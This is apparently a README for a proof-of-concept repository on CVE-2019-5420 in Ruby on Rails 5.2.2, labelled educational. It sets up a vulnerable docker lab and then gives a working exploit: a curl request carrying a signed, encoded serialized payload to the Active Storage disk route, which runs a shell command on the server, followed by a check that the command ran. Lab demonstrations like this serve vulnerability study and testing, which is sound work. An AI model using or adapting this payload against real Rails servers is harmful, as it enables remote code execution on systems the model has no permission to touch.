# CVE-2019-5420
CVE-2019-5420 (Ruby on Rails)

For educational purposes only.  

See `Reference` for the details.

## Environment

- Ruby: 2.6.0p0
- Rails: 5.2.2


## Run

```
$ docker run --name cve-2019-5420 --rm -p 3000:3000 knqyf263/cve-2019-5420
```

## Exploit

Execute `touch /tmp/rce`

```
$ curl http://127.0.0.1:3000/rails/active_storage/disk/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHZPa0JCWTNScGRtVlRkWEJ3YjNKME9qcEVaWEJ5WldOaGRHbHZiam82UkdWd2NtVmpZWFJsWkVsdWMzUmhibU5sVm1GeWFXRmliR1ZRY205NGVRazZEa0JwYm5OMFlXNWpaVzg2Q0VWU1FnZzZDVUJ6Y21OSkloVmdkRzkxWTJnZ0wzUnRjQzl5WTJWZ0Jqb0dSVlE2RGtCbWFXeGxibUZ0WlVraUJqRUdPd2xVT2d4QWJHbHVaVzV2YVFZNkRFQnRaWFJvYjJRNkMzSmxjM1ZzZERvSlFIWmhja2tpREVCeVpYTjFiSFFHT3dsVU9oQkFaR1Z3Y21WallYUnZja2wxT2g5QlkzUnBkbVZUZFhCd2IzSjBPanBFWlhCeVpXTmhkR2x2YmdBR093bFUiLCJleHAiOm51bGwsInB1ciI6ImJsb2Jfa2V5In19--78c21ddf5ca4239d862118730069e04fbf38fd3d/test
```

Check that `/tmp/rce` was generated

```
$ docker exec -it cve-2019-5420 ls /tmp/rce
```


## Reference
https://hackerone.com/reports/473888
